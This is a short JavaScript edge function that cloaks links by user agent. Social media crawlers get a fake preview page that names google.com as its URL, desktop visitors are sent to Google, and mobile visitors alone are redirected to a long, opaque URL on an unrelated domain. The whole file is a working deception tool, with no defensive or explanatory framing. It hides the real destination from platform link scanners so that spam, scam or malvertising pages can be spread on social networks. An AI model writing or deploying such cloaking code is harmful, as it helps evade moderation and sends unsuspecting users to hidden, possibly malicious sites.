export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😍🎧🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Fri-Sep-18-2026/b8e8637e-e1c0-4a74-8365-58c75787c00b/d6cdab83-fe97-4885-af15-ad03427445ca.avif">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/dBaYz/cnbb6/8LbJ756xNxn_tco/UmZcgRfcZup/5OxFomrglvII5i2RP/ygd66YCA/ulSPo/Hvb/Hda/YhdtuXn/sy-muDcgWgzQ_BDLeAW/mrrVLxxTkPu3dYkwz/Cv2/tjgbViwvp-l", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
